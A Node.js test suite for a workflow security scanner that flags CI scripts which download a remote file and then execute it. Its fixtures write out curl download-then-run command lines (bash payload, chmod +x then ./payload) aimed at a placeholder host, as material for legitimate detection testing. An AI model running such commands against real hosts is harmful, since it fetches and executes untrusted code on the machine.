'use strict';
// Inert detection fixtures: no downloaded script is ever executed.
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/x',HIGH='REMOTE_DOWNLOADED_FILE_EXECUTION',INC='REMOTE_EXECUTION_ANALYSIS_INCOMPLETE';
const audit=s=>{const y=['on: push','permissions: read-all','jobs:','  a:','    runs-on: ubuntu-latest','    steps:','      - run: |',...s.split('\n').map(x=>'          '+x)].join('\n')+'\n';return inspectWorkflow(y,{path:'.github/workflows/sentinel-round17.yml'});};
const positive=[
 ['oauth literal','curl --oauth2-bearer -- -o payload '+U+'; bash payload'],
 ['oauth quoted',"curl '--oauth2-bearer' -- -o payload "+U+'; bash payload'],
 ['oauth long output',"curl '--oauth2-bearer' -- --output=payload "+U+'; sh payload'],
 ['oauth direct exec','curl --oauth2-bearer -- -o payload '+U+'; chmod +x payload; ./payload'],
 ['oauth quoted direct exec',"curl '--oauth2-bearer' -- -o payload "+U+'; ./payload'],
 ['oauth nested wrapper','command curl --oauth2-bearer -- -o payload '+U+'; bash payload']
];
for(const [name,s] of positive)test('round17 detects '+name,()=>{
 const got=findingsForScript(s);
 assert.ok(got.includes(HIGH),name+JSON.stringify(got));
 assert.ok(audit(s).findings.some(x=>x.rule===HIGH),name);
});
const incomplete=[
 ['unknown quoted flag to bash',"curl '--unmodeled-token' -- -o payload "+U+'; bash payload'],
 ['unknown quoted flag to direct file',"curl '--unmodeled-token' -- -o payload "+U+'; ./payload'],
 ['unknown bare flag direct file','curl --unmodeled-token -- -o payload '+U+'; chmod +x payload; ./payload'],
 ['unknown short flag direct file','curl -Z -- -o payload '+U+'; ./payload']
];
for(const [name,s] of incomplete)test('round17 fails closed '+name,()=>{
 const got=findingsForScript(s);
 assert.ok(got.includes(INC)||got.includes(HIGH),name+JSON.stringify(got));
 assert.notEqual(audit(s).status,'NO_RISK_PATTERN',name);
});
const benign=[
 ['literal quoted header not an option',"curl -H 'X: --oauth2-bearer -- -o payload' -o safe "+U+'; bash payload'],
 ['oauth downloader only','curl --oauth2-bearer -- -o payload '+U],
 ['oauth no execution','curl --oauth2-bearer -- -o payload '+U+'; echo payload'],
 ['unknown quoted downloader only',"curl '--unmodeled-token' -- -o payload "+U],
 ['unknown quoted echo only',"curl '--unmodeled-token' -- -o payload "+U+'; echo payload'],
 ['real delimiter still respected','curl -- -o payload '+U+'; bash payload']
];
for(const [name,s] of benign)test('round17 benign '+name,()=>{
 const got=findingsForScript(s);
 assert.ok(!got.includes(HIGH),name+JSON.stringify(got));
});
